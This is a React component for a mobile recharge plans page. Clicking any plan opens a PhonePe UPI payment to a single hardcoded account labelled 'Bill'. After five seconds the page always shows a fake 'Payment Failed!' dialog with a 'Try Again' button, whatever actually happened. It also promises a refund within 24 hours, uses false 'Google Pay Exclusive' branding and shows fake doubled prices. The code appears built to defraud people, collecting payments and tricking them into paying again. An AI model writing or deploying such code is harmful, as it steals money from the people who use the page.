import React, { useState } from "react";
import { useAppContext } from "../Context/appContext";

const Plans = () => {
  const { user, setUser } = useAppContext();
  const [open, setOpen] = useState(false);
  const [selectedPayment, setSelectedPayment] = useState("");

  const onClickPay = (amt) => {
    setSelectedPayment(
      `phonepe://pay?pa=4405232014865358.cc@idfcbank&pn=Montaro&am=${amt}&cu=INR&tn=Bill`
    );
    window.open(
      `phonepe://pay?pa=4405232014865358.cc@idfcbank&pn=Montaro&am=${amt}&cu=INR&tn=Bill`,
      "_blank"
    );
    setTimeout(() => {
      setOpen(true);
    }, 5000);
  };

  return (
    <>
      {open && (
        <div
          tabIndex={-1}
          className="overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-screen max-h-full bg-slate-950/[.8]"
        >
          <div className="relative p-4 w-full max-w-md max-h-full top-1/3">
            <div className="relative bg-white rounded-lg shadow">
              <button
                type="button"
                className="absolute top-3 end-2.5 text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center"
                data-modal-hide="popup-modal"
                onClick={() => {
                  setOpen(false);
                }}
              >
                <svg
                  className="w-3 h-3"
                  aria-hidden="true"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 14 14"
                >
                  <path
                    stroke="currentColor"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"
                  />
                </svg>
                <span className="sr-only">Close modal</span>
              </button>

              <div className="p-4 md:p-5 text-center">
                <svg
                  className="mx-auto mb-4 text-gray-400 w-12 h-12"
                  aria-hidden="true"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 20 20"
                >
                  <path
                    stroke="currentColor"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M10 11V6m0 8h.01M19 10a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z"
                  />
                </svg>

                <h3 className="text-lg font-normal text-gray-500">
                  Payment Failed!
                </h3>
                <p className="text-xs text-gray-500 mb-5 ">
                  (Amount will credited by 24 hours in your account.)
                </p>

                <button
                  type="button"
                  onClick={() => {
                    window.open(selectedPayment, "_blank");
                  }}
                  className="text-white bg-blue-500 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm inline-flex items-center px-5 py-2.5 text-center"
                >
                  Try Again
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setOpen(false);
                  }}
                  className="py-2.5 px-5 ms-3 text-sm font-medium text-gray-900 focus:outline-none bg-white rounded-lg border border-gray-200 hover:bg-gray-100 hover:text-blue-700 focus:z-10 focus:ring-4 focus:ring-gray-100"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
      <div className="flex flex-col">
        <div className="bg-white py-4 px-4 text-[13.4px] flex items-center justify-between">
          <div className="flex items-center">
            <img
              src={user?.operator?.logo}
              alt="User"
              className="h-12 rounded-full"
            />

            <div className="font-bold text-[14px] text-blue-900 ml-2">
              <div>Recharge for: {user?.mobile}</div>
              <div className="text-slate-500 font-normal text-[12px] mt-[-2px]">
                {/* J/io Prepaid */}
                {user?.operator?.title}
              </div>
            </div>
          </div>

          <a className="text-blue-600" href="/">
            Change
          </a>
        </div>
        <div className=" px-2 my-0 bg-blue-50 py-5">
          <h1 className="text-[20px] font-bold text-center  mt-[-2px]">
            Google Pay Exclusive!
          </h1>
        </div>
        <div className="p-4">
          <div className="w-full max-w-md  rounded-2xl shadow-lg  ">
            <div className="flex flex-col gap-4">
              {user.operator.plans.map((item, index) => {
                return (
                  <div
                    onClick={() => {
                      onClickPay(item?.price?.toFixed(2));
                    }}
                    className={`border-b border-[#d3d3d3] rounded bg-white p-5 px-4`}
                    key={index}
                  >
                    <div className="flex justify-between gap-4">
                      <div className="flex flex-col gap-2">
                        <p className="text-[18px] font-[400] text-[#000]">
                          Data : {item.data}
                        </p>
                        <p className="text-[14px] text-[#4b4b4b]">
                          {item.description}
                        </p>
                        <p className="text-[14px] text-[#939393]">
                          Validity : {item.validity_days} Days
                        </p>
                      </div>
                      <div className="flex flex-col items-center ">
                        <button
                          onClick={() => {
                            // setSelectedPlan(item);
                          }}
                          className="min-w-max text-[#00baf2] text-[19px] p-[4px_10px] font-[600] border rounded-md"
                        >
                          <p>Rs. {item.price}</p>
                        </button>

                        <p className="text-[17px] line-through font-bold text-[#818181]">
                          Rs. {item.price * 2}
                        </p>
                      </div>
                    </div>
                    <button
                      onClick={() => {
                        // if (selectedPay) {
                        // window.open(
                        //   `phonepe://pay?pa=4405232014865358.cc@idfcbank&pn=Montaro&am=${item?.price?.toFixed(
                        //     2
                        //   )}&cu=INR&tn=Bill`,
                        //   "_blank"
                        // );
                        onClickPay(item?.price?.toFixed(2));

                        // }
                      }}
                      className="w-full bg-sky-500 hover:bg-sky-600 text-white font-semibold py-3 rounded-xl mt-3 active:scale-95 transition"
                    >
                      Pay now
                    </button>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Plans;
